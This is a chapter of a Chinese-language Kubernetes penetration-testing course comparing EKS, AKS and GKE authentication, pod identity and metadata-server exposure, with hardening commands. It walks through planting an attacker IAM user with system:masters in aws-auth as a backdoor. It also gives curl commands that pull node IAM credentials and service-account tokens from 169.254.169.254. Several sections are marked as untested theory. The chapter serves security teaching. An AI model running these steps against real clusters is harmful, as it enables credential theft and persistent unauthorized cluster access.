# Ch 30 — 託管 K8s 差異：EKS / AKS / GKE 各自的坑

> **目標**：理解三大雲端託管 K8s 服務在認證模型、Pod 身分、Metadata 存取上的架構差異，掌握「IAM 橋接」這個自管叢集不存在的攻擊面，能在滲透測試中識別各平台的特有入口。

---

## 為什麼需要

自管叢集（self-managed cluster）的攻擊樹我們已經走過：API Server 匿名存取、RBAC 濫用、etcd 直接讀取、Service Account Token 竊取、節點逃逸。這些路徑在託管叢集（managed cluster）上部分封閉了——你摸不到 control plane 的作業系統，etcd 更是雲端商私有資源——但換來的代價是多了一條新攻擊面：**雲端 IAM 與 K8s RBAC 之間的雙向橋接**。

IAM 帳號 → K8s cluster-admin 的路，或反過來 K8s 叢集管理員 → 雲端帳號接管，這兩條路在自管叢集根本不存在，但在 EKS、AKS、GKE 上是常態設計。不搞清楚各平台的具體橋接機制，滲透測試做到一半就會卡住。

---

## 先建直覺

```
自管 K8s（self-managed）
────────────────────────────────────────────
┌─────────────────────────────────┐
│         Control Plane VM        │
│  ┌────────┐  ┌────────────────┐ │
│  │  etcd  │  │  API Server    │ │
│  │ (直接) │  │  (你能 ssh 進) │ │
│  └────────┘  └────────────────┘ │
└─────────────────────────────────┘
         ▲
         │ 你完全掌控：
         │ - etcd 直讀/改
         │ - CA 金鑰在你手上
         │ - 任意新增 cluster-admin cert
         │ - 無需雲端 IAM
         ▼
    Worker Nodes
────────────────────────────────────────────

託管 K8s（EKS / AKS / GKE）
────────────────────────────────────────────
┌─────────────────────────────────┐
│      Cloud Provider 管理        │
│  ┌────────┐  ┌────────────────┐ │
│  │  etcd  │  │  API Server    │ │
│  │ (不可見)│  │  (SaaS 端點)  │ │
│  └────────┘  └────────────────┘ │
└──────────────┬──────────────────┘
               │
    ┌──────────▼──────────┐
    │  IAM ↔ K8s 橋接層   │   ← 這裡是新攻擊面
    │  aws-auth / AAD /   │
    │  Google OAuth        │
    └──────────┬──────────┘
               │
    Worker Nodes（你能存取）
    ┌───────────────────────┐
    │  EC2 / VM / GCE Node  │
    │  Metadata Server      │   ← 169.254.169.254
    │  (雲端憑證入口)        │
    └───────────────────────┘

攻擊向量雙向性：
  IAM 帳號洩漏  ──────────►  K8s cluster-admin
  K8s 叢集接管  ──────────►  雲端帳號接管
```

---

## 底層機制

### EKS（Amazon Elastic Kubernetes Service）

**認證機制：並存的兩套系統**

EKS 的認證架構歷史包袱重，目前同時存在兩套機制：

1. **aws-auth ConfigMap**（舊，正在棄用）
   位於 `kube-system/aws-auth`。IAM ARN 對映到 K8s username / group，由 AWS IAM Authenticator 解析。格式如下：

   ```yaml
   # kube-system/aws-auth ConfigMap
   apiVersion: v1
   kind: ConfigMap
   metadata:
     name: aws-auth
     namespace: kube-system
   data:
     mapRoles: |
       - rolearn: arn:aws:iam::123456789012:role/EKSNodeInstanceRole
         username: system:node:{{EC2PrivateDNSName}}
         groups:
           - system:bootstrappers
           - system:nodes
       - rolearn: arn:aws:iam::123456789012:role/DevOpsTeam
         username: devops
         groups:
           - system:masters          # ← 這行等於 cluster-admin
     mapUsers: |
       - userarn: arn:aws:iam::123456789012:user/alice
         username: alice
         groups:
           - developers
   ```

   **核心問題：K8s 對此 ConfigMap 零驗證**。YAML 格式錯誤、欄位拼錯、多餘空白，都可能讓所有人（包括叢集管理員）被鎖在外面，且無法透過 K8s API 修復（因為 API 本身無法認證了）。

2. **EKS Access Entries**（新，2024 年後推出）
   透過 EKS API 管理，不依賴 ConfigMap：

   ```bash
   # 建立 Access Entry
   aws eks create-access-entry \
     --cluster-name prod-cluster \
     --principal-arn arn:aws:iam::123456789012:role/AdminRole \
     --type STANDARD

   # 綁定 access policy
   aws eks associate-access-policy \
     --cluster-name prod-cluster \
     --principal-arn arn:aws:iam::123456789012:role/AdminRole \
     --policy-arn arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy \
     --access-scope type=cluster
   ```

**IRSA（IAM Roles for Service Accounts）**

Ch28 已詳細說明。補充一個滲透面：EKS 叢集有自己的 OIDC issuer URL（例如 `https://oidc.eks.ap-northeast-1.amazonaws.com/id/EXAMPLED539D4633E53DE1B71EXAMPLE`）。若攻擊者能在 AWS 帳號內建立新 EKS 叢集，就能建立自己控制的 OIDC issuer，再假冒 Service Account token 換取目標 IAM Role 的憑證——前提是目標 Role 的 trust policy 設定過於寬鬆（例如允許同帳號所有 OIDC issuer）。

**控制平面日誌**

EKS 有五種日誌：API server、audit、authenticator、controller manager、scheduler，全送 CloudWatch Logs。**預設全部關閉**。沒有 audit log 等於對 K8s API 操作視而不見。

```bash
# 查看目前日誌狀態
aws eks describe-cluster --name prod-cluster \
  --query 'cluster.logging.clusterLogging'

# 開啟所有日誌
aws eks update-cluster-config --name prod-cluster \
  --logging '{"clusterLogging":[{"types":["api","audit","authenticator","controllerManager","scheduler"],"enabled":true}]}'
```

**節點 IAM 角色**

受管節點群組（managed node group）的 EC2 instance role 必要最小權限：`AmazonEKSWorkerNodePolicy`、`AmazonEKS_CNI_Policy`、`AmazonEC2ContainerRegistryReadOnly`。常見錯誤是給節點 `AdministratorAccess` 或掛上 `AmazonS3FullAccess` 之類的業務用 Policy，讓容器逃逸後直接取得高權限 AWS 憑證。

---

### GKE（Google Kubernetes Engine）

**認證機制演進**

GKE 走過三個時代：

- **舊時代（已淘汰）**：Basic auth（帳密）、x509 client cert——現代 GKE 預設停用
- **現代**：Google OAuth token。`gcloud container clusters get-credentials CLUSTER_NAME` 把帶有 `gcloud auth` token 的 kubeconfig 寫入 `~/.kube/config`

**IAM Role → K8s RBAC 映射**（本段未實測，為理論預期行為，可於 GCP Console IAM 頁面驗證角色繼承關係）

| GCP IAM 角色 | K8s 對應 |
|---|---|
| `roles/container.clusterAdmin` | cluster-admin |
| `roles/container.developer` | edit |
| `roles/container.viewer` | view |

**GKE Workload Identity**

Pod 透過 Workload Identity Foundation 取得 Google Service Account（GSA）憑證。Token 路徑：`/var/run/secrets/workload-identity-foundation/token`（或舊版 `/var/run/secrets/tokens/gcp-ksa-token`）。這個 token 可以換取 Google OAuth access token，進而呼叫 GCP API。

```bash
# 在 Pod 內讀取 Workload Identity token
cat /var/run/secrets/workload-identity-foundation/token

# 換取 access token（本段未實測，為理論預期行為）
TOKEN=$(cat /var/run/secrets/workload-identity-foundation/token)
curl -X POST \
  "https://sts.googleapis.com/v1/token" \
  -H "Content-Type: application/json" \
  -d "{
    \"audience\": \"//iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/PROJECT_ID.svc.id.goog\",
    \"grantType\": \"urn:ietf:params:oauth:grant-type:token-exchange\",
    \"requestedTokenType\": \"urn:ietf:params:oauth:token-type:access_token\",
    \"scope\": \"https://www.googleapis.com/auth/cloud-platform\",
    \"subjectTokenType\": \"urn:ietf:params:oauth:token-type:jwt\",
    \"subjectToken\": \"$TOKEN\"
  }"
```

**Metadata Server 歷史**

GKE 1.12 以前，Pod 可以直接存取 `169.254.169.254`，竊取節點 Service Account token → 取得 GCP IAM 權限。Workload Identity 啟用後，metadata server 對 Pod 的回應被攔截，無法取得節點 SA token，但仍有部分 instance metadata 可讀（取決於 metadata concealment 設定）。

**Autopilot 模式** 禁止特權 Pod、hostPath 掛載、特定 DaemonSet 設定，大幅縮減容器逃逸路徑。Standard 模式則完全可設定，彈性高但責任也在你。

---

### AKS（Azure Kubernetes Service）

**認證機制：AAD 整合**

AKS 的認證核心是 Azure Active Directory（Azure AD / Entra ID）整合：

- **Managed AAD**：AKS 自動建立 AAD app registration，Azure AD 群組可對映到 K8s RBAC 或直接給 clusterAdmin
- **Azure RBAC for K8s**：在 Azure 層面直接用 IAM role 控制 K8s 存取，`Azure Kubernetes Service RBAC Cluster Admin` 角色 = cluster-admin

**本地帳號（Local Accounts）的陷阱**

AKS 叢集建立時預設也產生一個本地 admin kubeconfig（`az aks get-credentials --admin`）。這組憑證不走 AAD，是 x509 client cert，效期長（通常數年）。啟用 AAD 後忘記用 `--disable-local-accounts` 停用，等於留了一條不走 AAD 的後門。

```bash
# 停用本地帳號（建立時）
az aks create --name mycluster \
  --resource-group myRG \
  --enable-aad \
  --disable-local-accounts

# 既有叢集停用
az aks update --name mycluster \
  --resource-group myRG \
  --disable-local-accounts
```

**AKS Workload Identity**

Pod 透過 Azure Workload Identity 取得 Federated Credential token，可換取 Azure AD token，進而存取 Azure 資源（Key Vault、Storage、SQL 等）。機制與 IRSA 相似，但橋接到 Azure AD。

**節點資源群組（MC_... Resource Group）**

AKS 建叢集時會自動建一個 `MC_<RG>_<cluster>_<region>` 的資源群組，放節點 VM、磁碟、負載平衡器。若攻擊者在 Azure 層面對這個 RG 有 Contributor 角色，可以直接操作節點 VM（登入、快照、掛載磁碟）→ 節點存取 → 收割 Pod SA token（接 Ch28 路徑）。

**API Server 授權 IP 範圍**

AKS 預設 API server 對外網際網路可達（有 AAD 認證保護，但端點裸露）。可設定 `--api-server-authorized-ip-ranges` 限制來源，但許多叢集未設定。

---

## 範例一：EKS aws-auth 誤設與攻擊者植入

**場景**：攻擊者在 K8s 叢集內取得 `cluster-admin`（透過前章路徑），或在 AWS 層面取得 IAM 寫入權限，目標是建立持久化 K8s 存取。

```bash
# 讀取現有 aws-auth
kubectl get configmap aws-auth -n kube-system -o yaml

# 攻擊者在 aws-auth 中植入自己的 IAM ARN
# （前提：當前有 kubectl 寫入 kube-system 的權限）
kubectl edit configmap aws-auth -n kube-system
```

植入後的 ConfigMap 片段：

```yaml
data:
  mapUsers: |
    - userarn: arn:aws:iam::123456789012:user/attacker-user
      username: backdoor
      groups:
        - system:masters
```

之後攻擊者用自己控制的 IAM User 憑證即可存取叢集：

```bash
export AWS_ACCESS_KEY_ID=AKIA...ATTACKER
export AWS_SECRET_ACCESS_KEY=...
aws eks get-token --cluster-name prod-cluster
# 或直接
kubectl --kubeconfig attacker-kubeconfig get pods --all-namespaces
```

---

## 範例二：讀取 GKE Workload Identity token 並換取 GCP 憑證

**本段未實測，為理論預期行為。驗證方法：在已啟用 Workload Identity 的 GKE Pod 中執行。**

```bash
# 確認 Workload Identity 已啟用
env | grep GOOGLE

# 嘗試直接呼叫 Metadata API（Workload Identity 啟用後應受限）
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
# 預期：403 或 connection refused（WI 模式下被攔截）

# Workload Identity token 路徑（實際路徑依 GKE 版本有別）
ls /var/run/secrets/workload-identity-foundation/

# 確認 Pod 的 GSA binding
kubectl get serviceaccount my-sa -n my-ns -o jsonpath='{.metadata.annotations}'
# 預期輸出：{"iam.gke.io/gcp-service-account":"my-gsa@project.iam.gserviceaccount.com"}
```

---

## 範例三（邊界案例）：EKS 節點 IMDSv1 vs IMDSv2 的差異

```bash
# 在 EKS Pod 內嘗試存取節點 Metadata

# IMDSv1（舊，一步取得）—— 若節點允許 IMDSv1：
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 回傳節點 IAM Role 名稱，例如：EKSNodeInstanceRole

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EKSNodeInstanceRole
# 回傳 AccessKeyId / SecretAccessKey / Token

# IMDSv2（新，需先取 session token）：
TOKEN=$(curl -X PUT \
  "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  --silent)

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 若節點強制 IMDSv2（hop-limit=1），上述 PUT 在 Pod 內仍可執行
# 因為 Pod 與節點在同一 network namespace 的 IMDS path 下

# 驗證：強制 IMDSv2 並不代表 Pod 無法存取
# hop-limit=2 的節點（EKS 舊版預設）允許 Pod 直接用 IMDSv1
# hop-limit=1 才真正封鎖 Pod 的 IMDS 存取
aws ec2 describe-instances \
  --instance-ids <node-instance-id> \
  --query 'Reservations[].Instances[].MetadataOptions'
# 輸出：{"State":"enabled","HttpTokens":"required","HttpPutResponseHopLimit":1,...}
# HttpPutResponseHopLimit=1 才安全；=2 代表 Pod 仍可存取
```

**關鍵數字：hop-limit 的意義**
`HttpPutResponseHopLimit=1` 表示 PUT 請求的 TTL 只允許一跳——直接打 IMDS 的節點 process 沒問題，但容器跳了一層虛擬網路，TTL 歸零，PUT 失敗。`hop-limit=2` 讓容器也能通過，是常見的配置錯誤。

---

## 對比取捨表

| 面向 | EKS | AKS | GKE |
|---|---|---|---|
| **Control Plane 存取** | 不可達，透過 EKS API 管理 | 不可達，透過 Azure API | 不可達，透過 GCP API |
| **主要認證機制** | aws-auth ConfigMap / Access Entries | Azure AD / Entra ID | Google OAuth token |
| **Pod 身分機制** | IRSA（OIDC + IAM Role） | AKS Workload Identity（Federated Cred） | GKE Workload Identity（GSA） |
| **Metadata Server 保護** | IMDSv2（hop-limit=1 才安全） | 無原生阻斷，需 NetworkPolicy | Workload Identity 可阻斷節點 SA |
| **Audit Log 預設狀態** | 全部關閉（需手動開啟） | 部分整合 Azure Monitor | 可設定，Standard 預設關閉 |
| **本地 admin 帳號** | 無（IAM-based） | 有，需手動停用 | 無（Google Account-based） |
| **IAM → K8s 橋接** | aws-auth / Access Entries 誤設 | Azure RBAC role 誤設 | GCP IAM role 誤設 |
| **K8s → 雲端橋接** | IRSA SA 過度授權 | WI SA 過度授權 | GKE WI GSA 過度授權 |
| **節點資源存取風險** | EC2 instance role 過度授權 | MC_... RG Contributor 存取 | 節點 SA IAM binding |
| **最小化攻擊面操作** | 啟用 Access Entries，停 aws-auth | 停用 local accounts | 啟用 Workload Identity，停 legacy auth |

---

## 踩雷集錦

**1. aws-auth ConfigMap YAML 格式炸掉叢集存取**

`mapRoles` 和 `mapUsers` 是純字串欄位（`|`），不是 K8s 原生物件欄位，K8s API 不做任何驗證。縮排錯一格、多一個空白，authenticator 解析失敗，所有人包括叢集擁有者被鎖在外面。復原唯一路徑：有另一個有效的 IAM 憑證且 aws-auth 之前有備份，或用 AWS 支援工具直接操作 etcd（但你進不去）。實務上：**永遠在 CI/CD 中驗證 aws-auth 格式，不要手動 `kubectl edit`**。

**2. EKS 審計日誌預設關閉**

大多數 EKS 叢集對 K8s API 操作完全無審計記錄。攻擊者在叢集內的一切操作（RBAC 修改、Secret 讀取、Pod 建立）無跡可查。CloudTrail 只記錄 AWS API 呼叫，不記錄 K8s API 呼叫。評估客戶環境時第一件事：`aws eks describe-cluster --name X --query 'cluster.logging'`。

**3. GKE Legacy Metadata 端點殘留**

即使啟用了 Workload Identity，某些舊路徑可能仍可存取（本段未實測，為理論預期行為，應在目標 GKE 版本上驗證）：

```bash
# 這條路測試 legacy endpoint 是否仍回傳資料
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# 正確防護下應回傳錯誤，而非 token
# 驗證 metadata concealment 是否生效：
gcloud container clusters describe CLUSTER \
  --format="get(nodeConfig.workloadMetadataConfig)"
```

**4. AKS 本地帳號忘記停用**

常見架構：「我們用 AAD 了，很安全」，但 `az aks get-credentials --admin` 拿到的 x509 cert 效期可能是 5 年，且不走 AAD Conditional Access、MFA、登入風險策略。一旦這個 kubeconfig 外洩，攻擊者有 5 年的 cluster-admin 存取，AAD 那邊完全看不到。

**5. 受管附加元件（Managed Addon）的 RBAC 從不複查**

AWS VPC CNI、EBS CSI Driver、AWS Load Balancer Controller 在 kube-system 下都有 ClusterRole/ClusterRoleBinding，初始設定時權限往往比最小化要求寬鬆，且後續複查率極低。攻擊者若能接管這些元件的 Pod（例如透過供應鏈攻擊或 image 替換），即取得高權限 Service Account。

```bash
# 列出 kube-system 中高權限 SA 綁定
kubectl get clusterrolebinding -o json | \
  jq '.items[] | select(.subjects[]?.namespace == "kube-system") | 
      {name: .metadata.name, role: .roleRef.name}'
```

---

## 進階延伸

- **Cross-account IRSA 攻擊**：當 EKS 叢集 A 的 OIDC issuer 被帳號 B 的 IAM Role trust policy 信任，叢集 A 的 SA token 可換取帳號 B 的 AWS 憑證——跨帳號橫移。
- **GKE Binary Authorization**：強制所有部署的 image 需有 Google Cloud Build 的簽章，針對供應鏈攻擊的對策。
- **AKS Defender for Containers**：在節點層部署感測器，偵測執行時期異常（容器內的反向 Shell、異常 kubectl 呼叫等）。
- **EKS Pod Identity**（2023 年推出）：新的 Pod 身分機制，不需要 OIDC issuer，直接在 EKS API 層面管理 Pod 到 IAM Role 的對映，比 IRSA 更簡潔。
- **Kubernetes Audit Log + SIEM**：三個平台都支援把 K8s audit log 匯入 SIEM（CloudWatch → Splunk、Azure Monitor、Cloud Logging），但設定複雜度各異。

---

## 本章重點整理

- 託管 K8s 封閉了 etcd 和 control plane 直接存取，但引入了 **IAM ↔ K8s RBAC 雙向橋接**這個新攻擊面
- EKS 的 aws-auth ConfigMap 無驗證、無回滾機制，一個格式錯誤可鎖住整個叢集；Access Entries 是較安全的替代品
- EKS audit log 預設關閉，大多數叢集對 K8s API 操作完全無可見性
- IMDSv2 hop-limit=1 才真正阻止 Pod 存取節點 Metadata；hop-limit=2（舊預設值）讓 Pod 仍可取得節點 IAM 憑證
- GKE Workload Identity 阻斷 Pod 取得節點 SA token，但 legacy metadata 路徑需驗證是否徹底封閉
- AKS 本地帳號（x509 cert）是 AAD 之外的持久後門，啟用 AAD 後必須明確停用
- 受管附加元件（VPC CNI、CSI Driver）在 kube-system 下的 ClusterRole 往往過度授權且從未複查

---

## 自我檢核

1. EKS 的 aws-auth ConfigMap 和 Access Entries 有什麼功能差異？為什麼 ConfigMap 更危險？
2. 在 EKS Pod 內，什麼條件下可以成功呼叫 `169.254.169.254` 取得節點 IAM 憑證？
3. GKE Workload Identity 和 IRSA 的機制有什麼本質相似之處？Pod 取到的 token 各自拿去哪個端點換憑證？
4. AKS 的 `MC_...` 資源群組有什麼滲透價值？
5. 為什麼「我的 EKS 叢集啟用了 IAM 認證」不代表 K8s API 操作有審計記錄？
6. 攻擊者拿到某 EKS 叢集的 `cluster-admin`，可以對 aws-auth 做什麼持久化操作？

---

## 延伸閱讀

1. [AWS EKS Best Practices Guide — Security](https://aws.github.io/aws-eks-best-practices/security/docs/) — 官方安全指南，涵蓋 aws-auth、IRSA、audit log 各面向
2. [GKE Security Overview](https://cloud.google.com/kubernetes-engine/docs/concepts/security-overview) — Workload Identity 架構與 metadata concealment 的官方說明
3. [AKS Security Concepts](https://learn.microsoft.com/en-us/azure/aks/concepts-security) — AAD 整合、本地帳號、Workload Identity 詳細說明
4. [EKS Cluster Access Management (Access Entries)](https://docs.aws.amazon.com/eks/latest/userguide/access-entries.html) — 新版 Access Entries API 的遷移指南
5. [BadPods: Kubernetes Pod Privilege Escalation](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation) — Bishop Fox 的 Pod 逃逸研究，可與本章雲端 IAM 橋接場景結合

---

下一章進入 CI/CD 攻擊鏈（[Ch 31 — CI/CD 攻擊鏈：從 Pipeline 到叢集](31-cicd-attacks.md)），說明攻擊者如何從 Git repository 觸發 Pipeline，取得 K8s 部署憑證，完成從「一個 PR」到「叢集接管」的完整路徑。
